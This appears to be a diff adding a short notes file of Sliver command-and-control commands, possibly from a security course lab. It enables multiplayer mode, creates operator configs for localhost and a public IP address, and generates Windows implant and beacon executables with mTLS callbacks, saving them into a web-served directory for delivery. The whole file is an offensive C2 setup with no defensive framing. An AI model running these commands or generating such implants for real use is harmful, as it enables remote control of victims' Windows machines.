@@ -1,0 +1,12 @@
+// active multiplayers mode
+multiplayer
+
+// create config file
+new-operator --name 20120083 --lhost localhost --lport 31337 --save /home/kali/.sliver-client/configs
+new-operator --name 20120083 --lhost 18.143.102.216 --lport 31337 --save ../client_config/20120083_client_18.143.102.216_31337
+
+mv ./tools/client_config/20120083_client_18.143.102.216_31337 /home/kali/.sliver-client/configs
+
+// create implant sessions
+generate --mtls 192.168.216.14 --os windows --arch amd64 --format exe --save /var/www/html/sessions
+beacon --mtls 192.168.122.14:8080 --os windows --arch amd64 --format exe --save /var/www/html/beacons --seconds 5 --jitter 3
